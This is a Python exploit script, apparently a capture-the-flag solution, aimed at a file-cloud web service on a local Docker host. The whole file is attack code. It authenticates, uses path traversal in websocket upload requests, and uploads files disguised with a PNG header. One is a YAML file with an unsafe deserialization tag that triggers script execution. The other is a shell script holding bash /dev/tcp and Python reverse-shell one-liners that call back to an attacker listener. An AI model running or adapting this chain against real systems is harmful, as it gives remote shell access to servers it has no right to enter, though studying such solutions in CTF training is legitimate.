from urllib.parse import quote_plus

import asyncio
import json
import random
import requests
import string
import websockets

HOST = "172.17.0.2:8080"
USER = "liberty"
PASS = "Liberty@0"
LHOST = "172.17.0.1"
LPORT = 4444

def name_gen():
    return ''.join(random.sample(string.ascii_letters + string.digits, 7))

PATH_YAML_NOTIF = f"{name_gen()}.yml"
PATH_YAML_RCE = f"../configs/{name_gen()}.yml"
PATH_SCRIPT = f"../scripts/{name_gen()}.sh"
WEBSOCKET_REQUESTS = [
    {"requestType": 1, "message": PATH_YAML_NOTIF},
    {"requestType": 1, "message": PATH_YAML_RCE},
    {"requestType": 1, "message": PATH_SCRIPT},
]

YAML_NOTIF_CONTENT = '''\x89PNG:
'''
YAML_RCE_CONTENT = '''\x89PNG:
notifyUrl: !!org.ibctf.cloud.service.ScriptService []
'''
SCRIPT_CONTENT = f'''\x89PNG
/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
'''

async def ws(wshost):
    paths = {}
    async with websockets.connect(wshost) as websocket:
        resp = await websocket.recv()
        print(resp)
        for req in WEBSOCKET_REQUESTS:
            await websocket.send(json.dumps(req))
            resp = await websocket.recv()
            print(resp)
            paths[req["message"]] = json.loads(resp)["message"]
    return paths

session = requests.Session()
session.auth = (USER, PASS)
r = session.get(f"http://{HOST}")
path = r.json()["path"]
print(f"Got path: {path}")
paths = asyncio.run(ws(f"ws://{USER}:{quote_plus(PASS)}@{HOST}{path}"))

session.post(url=f"http://{HOST}/cloud/{paths[PATH_SCRIPT]}", data=SCRIPT_CONTENT, headers={"Content-Type": "image/png"})
session.post(url=f"http://{HOST}/cloud/{paths[PATH_YAML_RCE]}", data=YAML_RCE_CONTENT, headers={"Content-Type": "image/png"})
session.post(url=f"http://{HOST}/cloud/{paths[PATH_YAML_NOTIF]}", data=YAML_NOTIF_CONTENT, headers={"Content-Type": "image/png"})
